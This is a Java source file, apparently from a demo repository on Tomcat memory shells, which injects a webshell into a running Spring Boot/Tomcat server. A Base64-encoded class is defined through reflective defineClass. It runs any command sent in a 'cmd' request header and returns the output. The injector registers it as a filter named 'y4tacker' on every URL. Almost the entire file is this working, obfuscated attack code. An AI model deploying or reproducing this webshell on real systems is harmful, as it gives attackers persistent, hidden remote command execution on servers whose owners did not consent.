package com.example.tomcatmemshell.demos.web.spel;

import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;

import javax.servlet.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Map;

public class AddFilter2 {

    public static String FILTER_CLASS_STRING = "yv66vgAAADcAcgoAEwBABwBBCAAyCwACAEIKAEMARAoAQwBFCgA4AEYHAEcHAEgKAAkASQoACABKCgAIAEsLADUATAoATQBOCgA4AE8HAFALADYAUQcAUgcAUwcAVAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA/TGNvbS9leGFtcGxlL3RvbWNhdG1lbXNoZWxsL2RlbW9zL3dlYi9hZGRmaWx0ZXIvbWVtc2hlbGxmaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAFUHAFYHAFcHAFgHAFkHAFoBAApFeGNlcHRpb25zBwBbBwBcAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABNtZW1zaGVsbGZpbHRlci5qYXZhDAAVABYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DABdAF4HAF8MAGAAYQwAYgBjDABkAGUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAFQBmDAAVAGcMAGgAaQwAagBrBwBsDABtAG4MAG8AcAEAHmphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbgwAIABxAQA9Y29tL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvZGVtb3Mvd2ViL2FkZGZpbHRlci9tZW1zaGVsbGZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAd3YWl0Rm9yAQADKClJAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhABIAEwABABQAAAAEAAEAFQAWAAEAFwAAAC8AAQABAAAABSq3AAGxAAAAAgAYAAAABgABAAAAEAAZAAAADAABAAAABQAaABsAAAABABwAHQABABcAAAA1AAAAAgAAAAGxAAAAAgAYAAAABgABAAAAEgAZAAAAFgACAAAAAQAaABsAAAAAAAEAHgAfAAEAAQAgACEAAgAXAAABeAAFAAsAAABpK8AAAjoEGQQSA7kABAIAOgUZBcYATbgABRkFtgAGOgYZBrYABzoHuwAIWbsACVkZB7cACrcACzoIGQi2AAxZOgnGABEsuQANAQAZCbYADqf/6hkGtgAPV6cABToKpwALLSssuQARAwCxAAEAUgBYAFsAEAADABgAAAA6AA4AAAAWAAYAFwARABgAFgAZACAAGgAnABsAOQAdAEQAHgBSACEAWAAkAFsAIgBdACUAYAAmAGgAKgAZAAAAZgAKACAAPQAiACMABgAnADYAJAAlAAcAOQAkACYAJwAIAEEAHAAoACkACQAAAGkAGgAbAAAAAABpACoAKwABAAAAaQAsAC0AAgAAAGkALgAvAAMABgBjADAAMQAEABEAWAAyACkABQAzAAAASQAG/wA5AAkHABIHADQHADUHADYHAAIHADcHADgHADkHAAgAAPwAGAcAN0gHABD/AAEABgcAEgcANAcANQcANgcAAgcANwAAAgcAOgAAAAYAAgA7ADwAAQA9ABYAAQAXAAAAKwAAAAEAAAABsQAAAAIAGAAAAAYAAQAAAC0AGQAAAAwAAQAAAAEAGgAbAAAAAQA+AAAAAgA/";
    public AddFilter2() {
        try {
            final String name = "y4tacker";

            // 从线程中获取类加载器WebappClassLoaderBase
            TomcatEmbeddedWebappClassLoader contextClassLoader = (TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();
            // 获取TomcatEmbeddedContext对象
            WebResourceRoot resource = (WebResourceRoot) getField(contextClassLoader, Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources"));
            Context context = resource.getContext();
            // 从上下文中获取ApplicationContext对象
            ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            Class c = standardContext.getClass().getSuperclass();
            Field Configs = c.getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(name) == null) {
                Class<?> filterClass = getClass(FILTER_CLASS_STRING);

                FilterDef filterDef = new FilterDef();
                filterDef.setFilter((Filter) filterClass.newInstance());
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filterClass.getName());
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(name, filterConfig);

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getField(Object obj, Field field) {
        try {
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception e) {

        }
        return null;
    }

    public static Class<?> getClass(String classCode) throws InvocationTargetException, IllegalAccessException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        byte[] bytes = Base64.getDecoder().decode(classCode);

        Method method = null;
        Class<?> clz = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;

    }
}
